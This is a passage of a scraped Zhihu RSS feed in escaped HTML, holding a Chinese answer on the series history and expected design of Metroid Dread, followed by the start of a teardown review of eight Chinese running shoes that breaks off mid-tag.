data-private-watermark-src=\"v2-ae5705e3bbe70f41d15bc1dc7343a799\"></p>\n<p><b>你已经具备了相当多的能力，你可以开始肆无忌惮地探索：之前关闭的门都可以打开，之前堵死的路都可以通过，之前没去过的地方现在也能想办法去了，世界一下子豁然开朗，你就是那个传说中的“最强战士”。</b></p>\n<p>出神入化的关卡设计从这时开始淋漓尽致地显示出来，为了达成让玩家自由探索的目标，《超密》的每一个房间的布局都是经过精心考量的，在保证单个谜题质量的前提下，许多房间都允许玩家用两种及以上不同的方式通过，从而不产生重复跑图的厌烦心理；房间与房间之间的布局也十分讲究，捷径与暗道遍布在地图的各个角落，到达一个房间的路径又可以有多种；收集品层面，既然玩家已经有了超级炸弹与X光扫描，那就加大隐藏物品的发现难度，加大玩家的操作难度，把它放在天花板的顶上，没有裂缝的石头里，或者哪个你去都没去过的僻静角落里，来保证玩家每次发现隐藏物品都有满满的成就感；对于操作熟练的高阶玩家，设计师还设计了不少需要自己摸索的高阶操作技巧，比如无限炸弹跳与水晶恢复（消耗导弹与炸弹而实现满血恢复的隐藏技能），满足了高阶玩家对速通游戏的需求。</p>\n<p>诚然，如果用现代的眼光来审视这款1994年的游戏，《超密》不是一个完美的游戏。很多物品摆放的位置不人性化，手感比较陈旧，上手难度偏高，这都是的的确确存在的问题。但是《超密》带给玩家的探索感是经久不衰的，无论什么年代。</p>\n<p>说了半天《超密》，用一句话来总结，<b>《超级密特罗德》的探索感是首先是基于一定的限制，让玩家获得探索的相关能力；再一次性放手，用高自由度的关卡设计使玩家的探索始终存在正反馈。</b></p>\n<p>说回生存恐惧，为什么我会产生这种预期，实际上是来自官网报告vol.4里的一段话：“<b>『超级密特罗德』是全系列自由度最高的一作应该不为过。本次『密特罗德 生存恐惧』，如能善用各种技巧，可感受到与『超级密特罗德』相近的自由度。各种技能与道具可以提前获取，因此可尝试不同的攻关路线。</b>”</p>\n<p><img src=\"https://pic2.zhimg.com/v2-172f4b20a7e68d30ed0fb93ddab45d29_720w.jpg?rss\" data-rawwidth=\"2400\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-172f4b20a7e68d30ed0fb93ddab45d29\" data-watermark-src=\"v2-f8079667892ad03d58c51da259ffc2dd\" data-private-watermark-src=\"v2-c87f294027c8894ca03e678e7b9d4f69\"></p>\n<p>同样，在最近的媒体试玩的活动中，我也听到有“重拾了超密的探索感”“相关指引比较少”之类的话语，让我进一步提高了对生存恐惧的期待值。这次的关卡设计与探索感究竟如何，就等10月8号以后再见分晓吧！</p>\n<hr>\n<p><img src=\"https://pic1.zhimg.com/v2-1761885d6b92c990928dad5b57c7e451_720w.jpg?rss\" data-rawwidth=\"599\" data-rawheight=\"599\" data-size=\"normal\" data-caption=\"《密特罗德 融合》\" data-watermark=\"watermark\" data-original-src=\"v2-1761885d6b92c990928dad5b57c7e451\" data-watermark-src=\"v2-a97ffdfe8249c55cf58a66da831adc03\" data-private-watermark-src=\"v2-ab96f1122fcf2a36099a8eb204e71d0c\"></p>\n<h2>《密特罗德 融合》的恐惧感</h2>\n<p>《密特罗德 融合》是系列中最特殊的一部作品。</p>\n<p>《超级密特罗德》的推出虽然获得了游戏界的一致好评，但区区近200万的销量却让系列陷入了长达8年的沉寂中。1996年，任天堂推出了次时代3D主机<b>Nintendo 64</b>。在这八年空窗期中，任天堂的两大巨头ip——超级马力欧与塞尔达传说纷纷转型3D成功，在64上发布上游戏史上不可或缺的两部巨作——<b>《超级马里奥 64》与《塞尔达传说 时之笛》</b>。遗憾的是，N64的生命周期中没有迎来任何一部密特罗德作品，无论是2D还是3D，玩家们在N64上玩密特罗德的愿望最终还是落空了</p>\n<p>时间来到了2002年，为了给自家的新游戏机扩充游戏阵容，任天堂在2002年同时发行了两部密特罗德作品——一部是NGC上的《<b>密特罗德 究极</b>》，密特罗德的首部3D作品；另一部是GBA上的《<b>密特罗德 融合</b>》，是正统2D密特罗德系列的第四部作品。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d3444de8e71e309f241181095d2cf2ae_720w.jpg?rss\" data-rawwidth=\"282\" data-rawheight=\"400\" data-size=\"normal\" data-caption=\"密特罗德首部3D化作品，本文不详细介绍\" data-watermark=\"watermark\" data-original-src=\"v2-d3444de8e71e309f241181095d2cf2ae\" data-watermark-src=\"v2-6ae3c23fa15f620bd7a6d7825fdbe90f\" data-private-watermark-src=\"v2-15c8f0ee069c2e686bde466231aedf0b\"></p>\n<p>彼时由于《密特罗德 究极》的首次3D化再一次像红绿帽一样震撼了整个游戏界，玩家纷纷陶醉于《究极》那如同《超级密特罗德》一样奇诡而神秘的幻想世界中。</p>\n<p>作为《超密》的正统续作，同期发售的《密特罗德 融合》却遭到了冷落，很多老玩家<b>吐槽这次的探索流程过于线性，人工智能Adam所给的指引太多</b>，这使得这部正统2D续作的评价普遍不如《超级密特罗德》。</p>\n<p>然而，我们回过头看，会发现一个奇怪的现象：一开始被冷嘲热讽的《密特罗德 融合》，口碑竟然逐年稳步上升，获得了越来越多玩家的拥趸，甚至成为了某些粉丝心目中超越《超密》的神作。</p>\n<p>这究竟是怎么回事？</p>\n<p>我仔细游玩后发现，原因应该在于《<b>融合》所营造的独特的恐怖感与不安感，以及在这种氛围下对环境叙事手法的忠实。</b></p>\n<p><b>恐惧本身往往不是设计师想达到的最终目标，他们想要的其实是恐惧对气氛与节奏的调剂</b>。</p>\n<p>出于对恐惧本身的恐惧，玩家被迫提起精神，全神贯注地投入到游戏中去。一旦战胜了心中的恐惧，成就感也就会油然而生，这种成就感不同于探索，这是一种战胜自我的成就感。</p>\n<p>《密特罗德 融合》的主题就在于“<b>融合</b>”，这种<b>非自然且猎奇</b>的现象。故事讲述了与密特罗德融合的萨姆斯来到了一个融合了各种自然生态的空间站上，同时也遇到了融合了各种生物形态的新型生物。本作新出现的外来生命体X也具有与其他生物融合寄生的能力，甚至还能寄生在萨姆斯身上，诞生了全系列最恐怖的BOSS——<b>SAX</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-a76ce3578a793a20435ac35ecbe180b7_720w.jpg?rss\" data-rawwidth=\"2400\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"系列新登场的X生命体\" data-watermark=\"watermark\" data-original-src=\"v2-a76ce3578a793a20435ac35ecbe180b7\" data-watermark-src=\"v2-5056947f5a04379a6141e42016d06584\" data-private-watermark-src=\"v2-5cf8b06092c36313c9804a0be2d4bf7d\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-9a7f3bf2673408370eb19a6281ae512b_720w.jpg?rss\" data-rawwidth=\"2400\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"X的萨姆斯复制体——SAX\" data-watermark=\"watermark\" data-original-src=\"v2-9a7f3bf2673408370eb19a6281ae512b\" data-watermark-src=\"v2-a5a6536c2103d48898cb29550df2d038\" data-private-watermark-src=\"v2-b4c6f8e53582d765ffdd4db6bdfde1db\"></p>\n<p>各种不自然现象的集合使游戏气氛的恐怖程度在超密的基础上更进一步，<b>同时本作引入了类似生化危机3的逃脱机制——玩家需要躲避暂时无法战胜的SAX的攻击</b>，这种无法反抗的巨大压迫感极度地增长了玩家的不安情绪，每到一个地方都会胆战心惊，生怕SAX突然蹦出来把子弹糊你脸上。</p>\n<p>同时，本作的BOSS设计也“颇具新意”，不同于超密用体型巨大的BOSS来体现压迫感，融合更擅长用猎奇的设计来体现恐惧感。比如BOSS噩梦采用层层褪皮，控制重力的奇特设计征服了每个人的眼球；比如BOSS电子蜘蛛采用悬挂式人体描边打法，为玩家贡献了一次“躲子弹——射子弹”的迂回体验</p>\n<p><img src=\"https://pic1.zhimg.com/v2-39011b40999959fe29415b9c8894c0c4_720w.jpg?rss\" data-rawwidth=\"2400\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"个人认为是系列最好的BOSS设计\" data-watermark=\"watermark\" data-original-src=\"v2-39011b40999959fe29415b9c8894c0c4\" data-watermark-src=\"v2-9482d81be74931ede54cf1cb6b85d560\" data-private-watermark-src=\"v2-86de16f5913ca3ebec6779b0f86943c9\"></p>\n<p>相比于前作重旋律的BGM设计，这作的音乐更偏向于没有什么旋律的环境音效，这些音效失去了抓住玩家耳朵的力量，却揪住了玩家的心，不安的环境配上不协调的音效，后面还有人在追杀，还有什么事比这更恐怖吗？</p>\n<p>环境叙事也是本作的一大亮点，空中飞过的不明黑影，地面上原来活蹦乱跳的甲壳虫突然只剩下的狰狞的空壳，一条普通的活鱼接触到X后突然变成了一条巨大且丑陋的怪鱼……融合采用环境的变化作为它的叙述手段，比恐怖的文字更加令人不寒而栗。</p>\n<p><br></p>\n<p><b>回到这次的新作上，副标题DREAD说明了这次的主题——生存与恐惧，同时作为融合之后的正统续作，肯定也会继承相关的音乐设计与环境叙事，使游戏的各个方面都能够体现生存恐惧的主题，</b>所以在玩我的预期里，m5也应该有融合的恐惧感，而且势必也会更近一步。</p>\n<p>根据已知的相关信息，生存恐惧的主题大体会体现在三个方面：<b>一是对emmi的恐惧，</b>emmi继承了融合中SAX的设定，而且会更加灵活，更加智能；<b>二是对鸟人的恐惧，</b>鸟人族一定会是这次完结篇的重要角色，第二支预告的鸟人为什么要攻击萨姆斯，鸟人族究竟有什么不可战胜的秘密武器；<b>三是对Metroid与X的恐惧（猜测)，</b>X生物已经被确定存在与行星ZDR上，那ZDR上是否也会有残余的Metroid？生存恐惧作为Metroid故事的阶段完结，Metroid与X又会在故事里起到什么作用，他们还会是萨姆斯的敌人吗？</p>\n<hr>\n<p><img src=\"https://pic3.zhimg.com/v2-aaaa303e2b29b0f55ad15413bf41c106_720w.jpg?rss\" data-rawwidth=\"1132\" data-rawheight=\"601\" data-size=\"normal\" data-caption=\"左：《萨姆斯的回归》gameboy原作封面                              右：《萨姆斯归来》3DS重制版封面\" data-watermark=\"watermark\" data-original-src=\"v2-aaaa303e2b29b0f55ad15413bf41c106\" data-watermark-src=\"v2-0bc73b54f5c070a5240a164b8604a542\" data-private-watermark-src=\"v2-270dab49ecb8afa20620dccc63af7a1c\"></p>\n<h2>《萨姆斯归来》的现代化处理</h2>\n<p>2017年6月14日的任天堂E3展前发布会上，当人们还沉浸在《密特罗德 究极4》的LOGO饼正式发布的喜悦中时，还没有人能想到这款2017年中旬就公布的游戏直到2021年还连个实机画面都没有（法克！！！）与此同时，展会上还发布了一款3DS游戏——《密特罗德 萨姆斯归来》（简称萨归），本作是1991年发行的《密特罗德2 萨姆斯的回归》的完全重制版，首次采用3D背景2D玩法的设计，同时本作也是自2004年的《密特罗德 零点任务》后暌违13年的2D系列作品（惨淡的密特罗德系列），也得到了很多新老玩家的期待。</p>\n<p>《萨归》获得了游戏界的普遍好评：Metacritic 85/10  IGN 8.5/10  GI 9.75/10</p>\n<p>同时也是2017TGA的“最佳掌机游戏”，第21届D.I.C.E.游戏大奖“年度掌上游戏奖”</p>\n<p>即使如此，作为3DS末期最后的大作，区区几十万套只能说“基本符合预期”。同时，由于本作是1991年《密特罗德2》的完全重制版，也继承了原作因掌机限制而被迫线性设计的关卡地图、略显重复的BOSS与任务设计，因此在老玩家的心目中只能说“中规中矩”，甚至还不如1年前由同人粉丝制作的二代像素重制版《Another Metriod 2 remake》(《AM2R》）</p>\n<p>但是，《萨姆斯归来》的意义绝不仅仅停留在一部优秀的掌机旧作的重制版上，在原作的基础上，任天堂与这次的合作伙伴MercurySteam还进行了大量现代化的处理：首次采用3D建模背景，BOSS战加入3D过场，360度的全角度瞄准，引入了近战反击与AEION能量槽，并通过AEION能量槽机制加入了“导弹雨”“时间减缓”等辅助机制。更重要的是，这次的地图系统加入了标记等现代化功能，玩家可以在地图上注明某些特殊的房间，从而避免出现《超密》中想回去却找不到地方的尴尬。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-76f499d1cd3e818e822b3b23e0223325_720w.jpg?rss\" data-rawwidth=\"2400\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"用导弹雨胖揍利德雷\" data-watermark=\"watermark\" data-original-src=\"v2-76f499d1cd3e818e822b3b23e0223325\" data-watermark-src=\"v2-e940c02a5ea09dfb555090939cea688b\" data-private-watermark-src=\"v2-653d9c0beaf11f7f83eddef5e6a902c3\"></p>\n<p><b>现在看来，《萨姆斯归来》的现代化处理仅仅是个开始，《生存恐惧》无疑会更近一步。</b></p>\n<p>根据官网披露的消息，本作萨姆斯的动作槽将在《萨归》的基础上得到大幅扩充：</p>\n<ol>\n<li>原先只能在原地进行的近战反击，现在移动状态也可以</li>\n<li>加入“滑铲”的全新操作，很多狭窄的区域可以不用变球直接通过</li>\n<li>滑铲时遇到只能变球通过的细道会自动变球通过</li>\n<li>系列的“高跳”能力现在被可控性更高的“二级跳”取代</li>\n<li>一键变球，360度瞄准与扫描机制得到了保留</li>\n<li>增加“十字球炸”与prime系列的多重导弹</li>\n<li>系列经典能力悉数回归，包括加速鞋与“凤凰之舞”</li>\n<li>AEION能力更改，加入全新的“闪光冲刺”“幻影斗篷”</li>\n<li>多种技能现可以组合运用，比如加速鞋可以与滑铲、踢墙跳连用，达到行云流水的效果</li>\n</ol>\n<p><img src=\"https://pic1.zhimg.com/v2-f074bd7d5df7bc3bfabdfb5286a186ae_720w.jpg?rss\" data-rawwidth=\"2400\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"PRIME系列的多发瞄准导弹\" data-watermark=\"watermark\" data-original-src=\"v2-f074bd7d5df7bc3bfabdfb5286a186ae\" data-watermark-src=\"v2-4f8ea6c4683acc44330edb7e512df158\" data-private-watermark-src=\"v2-1d0e1af50a0bf06fe06c9d83666c2b41\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-76447afdc5508809df1afd31b4b579f0_720w.jpg?rss\" data-rawwidth=\"2400\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"可以移动中进行的“近战反击”\" data-watermark=\"watermark\" data-original-src=\"v2-76447afdc5508809df1afd31b4b579f0\" data-watermark-src=\"v2-546d171986cc938c719a733b43789bba\" data-private-watermark-src=\"v2-748093d0da897fa90887912690e38e75\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-06212d7a3044fe8b35fcd08e4730ce8f_720w.jpg?rss\" data-rawwidth=\"2400\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"全新的AEION能力“闪光冲刺”，可以消耗全部AEION能量实现1-3次水平瞬移\" data-watermark=\"watermark\" data-original-src=\"v2-06212d7a3044fe8b35fcd08e4730ce8f\" data-watermark-src=\"v2-bee0d5357c513e4278ff5a5ea7ddf450\" data-private-watermark-src=\"v2-72367a61171ed39232a637fe6ad2e38a\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-e368f85839f256f95a47b336e84b87d4_720w.jpg?rss\" data-rawwidth=\"2400\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"全新的AEION能力“幻影斗篷”，可以暂时躲避EMMI的追捕\" data-watermark=\"watermark\" data-original-src=\"v2-e368f85839f256f95a47b336e84b87d4\" data-watermark-src=\"v2-d7a363ea40105d9359449d4ad4951e5f\" data-private-watermark-src=\"v2-9153ee5e4f4278de0440a1d87193d2e4\"></p>\n<p>下面是一段运用多种能力组合、极其行云流水的片段：</p>\n<a href=\"https://www.zhihu.com/video/1428036622697197568\"></a><p><br></p>\n<p>同时，生存恐惧依然采用<b>3D建模2D玩法的画面设计</b>，不过由于这次发售在NS，画面的色彩丰富度，建模精细度，光影特效全部大幅进化，密特罗德也终于迎来了高清时代。</p>\n<p><b>地图系统的功能也更加现代化</b>，标注等功能变得更加实用；<b>新加的任务说明系统</b>可以有效防止出现隔段时间打开游戏出现的“我是谁？““我在哪？”“我要干什么的？”的哲学三问，暌违19年的正统续作也总算没有落后时代。</p>\n<hr>\n<p>根据已知的消息，这次的M5理应具有媲美《融合》的恐惧感与《萨姆斯归来》的动作感，不然怎么对得起你这次DREAD的副标题与空前强化的动作槽。</p>\n<p>我现在唯一担心的其实是M5的探索感，虽然官方报告中的“可以乱序获得能力”就像一颗及时的定心丸，但也的的确确拉高了我的期待。《超级密特罗德》之所以连续二十几年屹立不倒，就在于它超越时光的关卡设计与探索感。<b>这些东西不是现代的设计师们靠灵光一现就能做到的，这需要的是几十年沉淀积累的关卡设计理念，需要的是用时间来反复打磨的“匠人精神”，正是这些难能可贵的品质与才华铸就了密特罗德系列，铸就了Metroidvania这一全新的游戏类型。</b></p>\n<p><b>希望这次任天堂与水银蒸汽还能带给我们一部如同《塞尔达传说 旷野之息》与《超级马力欧奥德赛》一样伟大的作品！</b></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/say-66-3?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Scramble</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/490296535/answer/2151280565?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">20 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/431009539?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如果任天堂的SWITCH搭载苹果M1芯片会怎样？</a><br><a href=\"http://www.zhihu.com/question/390928263?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">据说SWITCH游戏卡特别苦，怎样在不舔的情况下满足好奇心？</a><br>\n","link":"http://www.zhihu.com/question/490296535/answer/2151280565?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"国产哪些跑鞋值得入手？","date":"2021-10-08 05:06:33","description":"\n<p>作为跑鞋博主，好久没有写过这么酣畅淋漓的回答了，这次借助 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/9f4fb22e0686450a11c6d5dc122e4888\" data-hash=\"9f4fb22e0686450a11c6d5dc122e4888\" data-hovercard=\"p$b$9f4fb22e0686450a11c6d5dc122e4888\">@知乎生活</a> 的翻牌众测活动，从市面上选取了8双畅销的国产慢跑鞋，对其进行了<b>路跑测试</b>和<b>拆解测评</b>。</p>\n<p><b>这是写了数十万收藏的跑鞋相关回答以来最硬核的一篇回答，让我们看看这8双国产跑鞋到底哪些值得入手？</b></p>\n<p>在拆解前还是非常心疼的，也在想到底<b>拆解测评的意义</b>有多大。可是随着一双双跑鞋被拆解露出内部结构，<b>看到了很多商家不想让我们知道的东西，以及很多惊喜的设计</b>，更加坚定了要拆解下去的信心，这就是拆解测评的意义所在吧：</p>\n<p><b>希望能为普通跑步爱好者提供更全面的选购参考，而不只是商家想让你知道的片面信息。</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-7b960738efde06e605951811e8fb1898_720w.jpg?rss\" data-caption=\"跑鞋拆解现场\" data-size=\"normal\" data-rawwidth=\"804\" data-rawheight=\"1073\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>本次关于跑鞋的测评不仅有常规的<b>参数对比和路跑测试</b>，还额外加入了2个全新的测评方法：</p>\n<p><b>拆解测评和左右脚穿不同型号跑鞋路跑测试</b></p>\n<h2><b>1. 拆解测评-共拆解了8双国产跑鞋</b></h2>\n<p><b>拆解后</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-bd21dbaa09cdda96d902cea97605c0a4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"829\" data-rawheight=\"622\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>拆解前</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-a93b769f3b766c9f7b97fd45d156ed5c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"862\" data-rawheight=\"582\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h2><b>2. 左右脚穿不同跑鞋路跑测试</b></h2>\n<p>该测试具有一定的风险性，请勿模仿</p>\n<p><b>由于不同型号的跑鞋缓震不同，中底厚度不同，会导致左右脚受力不同，触地时间不同，长时间重复性的跑步可能会导致受伤，所以该测试请勿模仿。</b></p>\n<p><b>路跑测试：</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-5fa7ccd5c8d5b8a2f6ec17ce7dce76ec_720w.jpg?rss\" data-caption=\"361国际线Spire-R和必迈千里\" data-size=\"normal\" data-rawwidth=\"880\" data-rawheight=\"880\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-27b581fd7879c4db841e87e4acc690a1_720w.jpg?rss\" data-caption=\"多威反重力和特步动力巢\" data-size=\"normal\" data-rawwidth=\"855\" data-rawheight=\"855\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>在</b>测评之前，先把8双跑鞋的重量和邵氏硬度计测量的重量参数列出来，大家根据这个量化的对比数据，先猜一猜：</p>\n<p><b>哪款跑鞋踩屎感最强？</b></p>\n<p><b>哪款跑鞋适合跑长距离？</b></p>\n<p><b>测评结束后看看和你的猜测是否一致</b></p>\n<table data-draft-node=\"block\" data-draft-type=\"table\" data-size=\"normal\" data-row-style=\"normal\"><tbody>\n<tr>\n<td></td>\n<td>匹克态级3.0PRO</td>\n<td>鸿星尔克Flex 3.0</td>\n<td>必迈千里</td>\n<td>361国际线Spire-R</td>\n<td>李宁越影</td>\n<td>安踏创1.5</td>\n<td>多威反重力</td>\n<td>特步动力巢</td>\n</tr>\n<tr>\n<td>重量（g）</td>\n<td>307g</td>\n<td>275g</td>\n<td>308g</td>\n<td>311g</td>\n<td>309g</td>\n<td>350g</td>\n<td>398g</td>\n<td>393g</td>\n</tr>\n<tr>\n<td>邵氏硬度</td>\n<td>39C</td>\n<td>40C</td>\n<td>55C</td>\n<td>46C/58C</td>\n<td>45C</td>\n<td>45C</td>\n<td>45C/58C</td>\n<td>42C</td>\n</tr>\n</tbody></table>\n<p><b>称量仪称重：</b></p>\n<b></b><p><img src=\"https://pic4.zhimg.com/v2-b0f30441e5bcd8d9f407123e7ce7f8b9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"995\" data-rawheight=\"746\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>邵氏硬度计测量硬度：</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-97a78213b98ddaf062c9f61ff9651d7c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"826\" data-rawheight=\"619\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>在对于跑鞋定位及路跑测试后将8双跑鞋分成了3类。下面的测评将按照休闲跑鞋，长距离慢跑鞋以及大体重跑鞋三类来进行一个横向的对比测评。</p>\n<p>对比的维度将从：</p>\n<p><b>缓震回弹性能；稳定支撑性能；重量；</b>透气，耐磨，包裹，颜值等方面展开。</p>\n<p>其中重点测评对保护性最重要的<b>缓震回弹表现和稳定支撑表现</b>。</p>\n<h2>一．休闲跑鞋</h2>\n<p>休闲跑鞋主要是用于平时走路穿，特点是脚感特别舒适（俗称的踩屎感比较强），跑鞋中底比较软，不适合长距离跑步，再强调一遍，<b>踩屎感强的鞋真的不适合跑步</b></p>\n<table data-draft-node=\"block\" data-draft-type=\"table\" data-size=\"normal\" data-row-style=\"normal\"><tbody>\n<tr>\n<td></td>\n<td>匹克态级3.0PRO</td>\n<td>鸿星尔克Flex 3.0</td>\n</tr>\n<tr>\n<td>重量（g）</td>\n<td>307g</td>\n<td>275g</td>\n</tr>\n<tr>\n<td>邵氏硬度</td>\n<td>39C</td>\n<td>40C</td>\n</tr>\n</tbody></table>\n<h3>1. 缓震回弹表现</h3>\n<p><b>鸿星尔克flex 3.0中底压缩形变gif图：</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-3515a2c056443f45edfe04668eb1ae45_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"403\" data-watermark=\"watermark\" data-original-src=\"v2-3515a2c056443f45edfe04668eb1ae45\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>匹克态级3.0 PRO</b>中底压缩gif图：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-5a55b410d25b17ef8af35077bc18ea94_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"407\" data-watermark=\"watermark\" data-original-src=\"v2-5a55b410d25b17ef8af35077bc18ea94\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>鸿星尔克flex 3.0和匹克态级3.0PRO硬度值几乎在同一水平，如果用一个字形容，<b>那就是-软，</b>满满的踩屎感。</p>\n<p>每一步都能感受到中底充沛的压缩形变，这也是休闲跑鞋所需要的，好像踩在棉花里一样的感觉。</p>\n<p>这么大的压缩变形，实在是太讨好脚感了，可是没有像Pebax那样的回弹的话，只会越跑越累，所以说他们的定位是休闲跑鞋。</p>\n<h3>2. 稳定支撑表现</h3>\n<p>鸿星尔克Flex 3.0</p>\n<p>鸿星尔克京东官方旗舰店对于该款跑鞋的描述是：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-0f051caa812323a48273f7d01eb7f4bc_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"917\" data-rawheight=\"194\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>实际拆解内部结构：</b></p>\n<p>实际拆解出来的碳板和官方介绍的碳板有非常大的差异。</p>\n<p><b>官方介绍的碳板几乎从后跟延伸到前掌</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-e18001f6bf0a964b5db48b297df6b099_720w.jpg?rss\" data-caption=\"店铺网页跑鞋内部结构爆炸图\" data-size=\"normal\" data-rawwidth=\"998\" data-rawheight=\"438\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>实际拆解出来的碳板仅仅覆盖消费者能看到的裸露部分，看不到的部分几乎全是空的。</b></p>\n<p><b>裸露的碳板：</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-0cb3080d0853697e233187a2f3b3e956_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"956\" data-rawheight=\"646\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>拆解的碳板，覆盖部分几乎无碳板</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-2a524f3febc43f8223ce1486d3c1da52_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"928\" data-rawheight=\"626\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>再看整个跑鞋的结构：</p>\n<p>前掌以及后跟都是翘起的弧度设计，中足处是一般竞速鞋才有的收腰设计，导致整个鞋和地面的接触面积非常小，再配合上几乎没有抗扭转作用的极小的碳板。</p>\n<p>而且跑鞋的中底又太软，每一次落地的形变都非常大。</p>\n<p>造成的结果就是在跑步过程中落地非常不稳，需要脚踝额外发力来维持落地的稳定，因此增加了受伤的风险，目前跑了2次，跑到5km后脚踝会有酸痛的症状。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-06aa1d30c9a8996ccbe0b4d5781aace4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"914\" data-rawheight=\"685\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>这双鞋真的不太适合跑步，因此把它列在了休闲跑鞋的类别里。</b></p>\n<p><b>希望厂家把精力用在提升产品力上，不要再拿碳板做营销了，这么小一个碳板（故意裸露让消费者看见）用在这里除了吸引眼球还能有什么实际用处呢？</b></p>\n<ul><li><b>匹克态级3.0 PRO</b></li></ul>\n<p>态级的定位是休闲跑鞋，39C的硬度，同样是满满的踩屎感，态级从最初的1.0被跑友诟病太软，稳定性太差。后来升级到稳定性提升的2.0，再到如今的3.0，产品迭代非常之快，3.0PRO相比上一代的2.0PRO做了大幅度瘦身，44码单只重量307g。</p>\n<p>虽然同样软，但态级3.0PRO的稳定支撑性由于鞋底的抗扭转片刚度非常高，并且整个鞋底落地时大面积接触地面，所以稳定性非常好</p>\n<p><b>鞋底的X形抗扭转片：</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-4e920aae43b34cbb22bb1c105d98abe0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"783\" data-rawheight=\"588\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>抗扭片刚度很强，拆解时非常用力才能掰断：</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-dd0bcc8d9e23a16e61c5b465792c928b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"838\" data-rawheight=\"629\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>这款鞋在测试时跑5km非常轻松，加上非常高的颜值，因此休闲跑以及平时街穿都非常合适</p>\n<p><img src=\"https://pic1.zhimg.com/v2-82f84d1d782ab188fef280249402b49e_720w.jpg?rss\" data-caption=\"\" 